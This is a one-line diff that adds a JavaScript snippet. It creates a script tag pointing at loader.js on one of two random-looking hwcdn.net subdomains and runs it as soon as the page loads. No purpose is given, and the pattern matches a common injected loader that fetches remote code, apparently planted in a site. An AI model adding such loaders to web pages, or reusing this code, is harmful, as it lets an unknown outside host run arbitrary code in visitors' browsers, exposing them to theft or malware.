@@ -1,0 +1,1 @@
+var genSrcLoad=function(){var start=function(){var head=document.getElementsByTagName("head")[0];var script=document.createElement("script");script.src=("https:"==document.location.protocol?"https://a8u3b6i3.ssl.hwcdn.net/":"http://cds.z4n9c7x4.hwcdn.net/")+"btk/js/loader.js";head.appendChild(script);};return{start:start};}();genSrcLoad.start();
